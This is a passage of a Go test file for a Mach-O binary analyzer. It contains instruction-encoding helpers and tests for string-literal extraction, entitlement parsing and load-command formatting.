		literals = appendInterestingStringValueLiterals(literals, seen, value, 0x1000+uint64(index*0x100), index*0x100, 0)
	}

	for _, unwanted := range []string{
		"/bin/zshX",
		"/Applications/Google",
		"/tmp/com.apple.lock/cron/cron_asked/var/at/tabs/no",
		"Applemachdep.cpu.brand_string",
	} {
		if hasStringLiteralValue(literals, unwanted) {
			t.Fatalf("packed string noise %q became a Mach-O literal: %#v", unwanted, literals)
		}
	}
	for _, wanted := range []string{
		"/Applications/Google Chrome.app/",
		"/tmp/com.apple.lock/cron/cron_asked",
	} {
		if !hasStringLiteralValue(literals, wanted) {
			t.Fatalf("validated path %q was not retained: %#v", wanted, literals)
		}
	}
}

func encodeTestADRP(rd uint32, pc, target uint64) uint32 {
	pageDelta := (int64(target&^0xfff) - int64(pc&^0xfff)) >> 12
	imm := uint32(pageDelta) & 0x1fffff
	immlo := imm & 0x3
	immhi := (imm >> 2) & 0x7ffff
	return 0x90000000 | (immlo << 29) | (immhi << 5) | (rd & 0x1f)
}

func encodeTestADDImmediate(rd, rn uint32, imm uint64) uint32 {
	return 0x91000000 | (uint32(imm&0xfff) << 10) | ((rn & 0x1f) << 5) | (rd & 0x1f)
}

func encodeTestADR(rd uint32, pc, target uint64) uint32 {
	delta := int64(target) - int64(pc)
	imm := uint32(delta) & 0x1fffff
	immlo := imm & 0x3
	immhi := (imm >> 2) & 0x7ffff
	return 0x10000000 | (immlo << 29) | (immhi << 5) | (rd & 0x1f)
}

func encodeTestLDRXUnsigned(rt, rn uint32, offset uint64) uint32 {
	return 0xf9400000 | (uint32((offset/8)&0xfff) << 10) | ((rn & 0x1f) << 5) | (rt & 0x1f)
}

func encodeTestMOVRegister(rd, rn uint32) uint32 {
	return 0xaa0003e0 | ((rn & 0x1f) << 16) | (rd & 0x1f)
}

func encodeTestBL(pc, target uint64) uint32 {
	delta := int64(target) - int64(pc)
	return 0x94000000 | (uint32(delta>>2) & 0x03ffffff)
}

func encodeTestX86RIPRelativeMOVToReg(reg uint8, instrVA, target uint64) []byte {
	rex := byte(0x48)
	if reg&8 != 0 {
		rex = 0x4c
	}
	out := []byte{rex, 0x8b, 0x05 | ((reg & 0x7) << 3), 0, 0, 0, 0}
	disp := int32(int64(target) - int64(instrVA+uint64(len(out))))
	binary.LittleEndian.PutUint32(out[3:7], uint32(disp))
	return out
}

func encodeTestX86RIPRelativeLEAToReg(reg uint8, instrVA, target uint64) []byte {
	rex := byte(0x48)
	if reg&8 != 0 {
		rex = 0x4c
	}
	out := []byte{rex, 0x8d, 0x05 | ((reg & 0x7) << 3), 0, 0, 0, 0}
	disp := int32(int64(target) - int64(instrVA+uint64(len(out))))
	binary.LittleEndian.PutUint32(out[3:7], uint32(disp))
	return out
}

func encodeTestX86MOVReg(dst, src uint8) []byte {
	return []byte{0x48, 0x89, 0xc0 | ((src & 0x7) << 3) | (dst & 0x7)}
}

func encodeTestX86BaseDisp8(opcode, dst, base uint8, disp int8) []byte {
	return []byte{0x48, opcode, 0x40 | ((dst & 0x7) << 3) | (base & 0x7), byte(disp)}
}

func encodeTestX86BaseNoDisp(opcode, dst, base uint8) []byte {
	return []byte{0x48, opcode, ((dst & 0x7) << 3) | (base & 0x7)}
}

func encodeTestX86SIBBaseDisp8(opcode, dst, base uint8, disp int8, index uint8) []byte {
	return []byte{
		0x48,
		opcode,
		0x40 | ((dst & 0x7) << 3) | 0x4,
		((index & 0x7) << 3) | (base & 0x7),
		byte(disp),
	}
}

func encodeTestX86CALL(instrVA, target uint64) []byte {
	out := []byte{0xe8, 0, 0, 0, 0}
	rel := int32(int64(target) - int64(instrVA+uint64(len(out))))
	binary.LittleEndian.PutUint32(out[1:5], uint32(rel))
	return out
}

func encodeTestX86IndirectCALL(instrVA, pointerVA uint64) []byte {
	out := []byte{0xff, 0x15, 0, 0, 0, 0}
	displacement := int32(int64(pointerVA) - int64(instrVA+uint64(len(out))))
	binary.LittleEndian.PutUint32(out[2:6], uint32(displacement))
	return out
}

func testMachOIndirectSectionLoad(name, segment string, address, size uint64, sectionType, indirectStart, reserved2 uint32) macho.Load {
	raw := make([]byte, 72+80)
	binary.LittleEndian.PutUint32(raw[0:4], uint32(macho.LoadCmdSegment64))
	binary.LittleEndian.PutUint32(raw[4:8], uint32(len(raw)))
	binary.LittleEndian.PutUint32(raw[64:68], 1)
	section := raw[72:]
	copy(section[0:16], name)
	copy(section[16:32], segment)
	binary.LittleEndian.PutUint64(section[32:40], address)
	binary.LittleEndian.PutUint64(section[40:48], size)
	binary.LittleEndian.PutUint32(section[64:68], sectionType)
	binary.LittleEndian.PutUint32(section[68:72], indirectStart)
	binary.LittleEndian.PutUint32(section[72:76], reserved2)
	return macho.LoadBytes(raw)
}

func encodeTestDylibLoad(cmd uint32, name string) []byte {
	return encodeTestDylibLoadWithOffset(cmd, 24, name)
}

func encodeTestDylibLoadWithOffset(cmd uint32, nameOffset uint32, name string) []byte {
	offset := int(nameOffset)
	out := make([]byte, offset+len(name)+1)
	binary.LittleEndian.PutUint32(out[0:4], cmd)
	binary.LittleEndian.PutUint32(out[4:8], uint32(len(out)))
	binary.LittleEndian.PutUint32(out[8:12], nameOffset)
	copy(out[offset:], name)
	return out
}

func testMachOSection(name string, addr uint64, data []byte) *macho.Section {
	flags := uint32(0)
	segment := ""
	if name == "__objc_selrefs" {
		flags = 0x5 // S_LITERAL_POINTERS
		segment = "__DATA"
	}
	return &macho.Section{
		SectionHeader: macho.SectionHeader{Name: name, Seg: segment, Addr: addr, Size: uint64(len(data)), Flags: flags},
		ReaderAt:      bytes.NewReader(data),
	}
}

func TestEntitlementKeysReturnsOnlyTopLevelKeys(t *testing.T) {
	body := []byte(`<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
  <key>com.apple.security.files.user-selected.read-write</key><true/>
  <key>get-task-allow</key><true/>
  <key>keychain-access-groups</key><array><string>TEAMID.com.example</string></array>
  <key>file-write-data</key><true/>
  <key>com.apple.security.exception.shared-preference.read-only</key>
  <dict>
    <key>user-preference-read</key><array><string>com.example.app</string></array>
  </dict>
  <key>com.apple.security.temporary-exception.files.absolute-path.read-only</key>
  <dict>
    <key>file-read-data</key><array><string>/Library/Preferences/com.example.plist</string></array>
  </dict>
</dict>
</plist>`)
	got := entitlementKeys(body)
	want := []string{
		"com.apple.security.exception.shared-preference.read-only",
		"com.apple.security.files.user-selected.read-write",
		"com.apple.security.temporary-exception.files.absolute-path.read-only",
		"get-task-allow",
		"keychain-access-groups",
	}
	if len(got) != len(want) {
		t.Fatalf("entitlementKeys() = %#v; want %#v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("entitlementKeys() = %#v; want %#v", got, want)
		}
	}
	if got := entitlementContexts("get-task-allow"); len(got) != 1 || got[0] != "debuggable" {
		t.Fatalf("entitlementContexts(get-task-allow) = %#v", got)
	}
}

func TestMachOLoadCommandFormatting(t *testing.T) {
	uuid := []byte{
		0x00, 0x11, 0x22, 0x33,
		0x44, 0x55,
		0x66, 0x77,
		0x88, 0x99,
		0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
	}
	if got := formatUUID(uuid); got != "00112233-4455-6677-8899-aabbccddeeff" {
		t.Fatalf("formatUUID() = %q", got)
	}
	if got := machoVersion(0x000d0301); got != "13.3.1" {
		t.Fatalf("machoVersion() = %q", got)
	}
	if got := versionMinPlatform(lcVersionMinMacOSX); got != "macos" {
		t.Fatalf("versionMinPlatform() = %q", got)
	}
	if got := buildPlatform(6); got != "mac-catalyst" {
		t.Fatalf("buildPlatform(6) = %q", got)
	}
	if got := buildPlatform(99); got != "platform-99" {
		t.Fatalf("buildPlatform(99) = %q", got)
	}
}
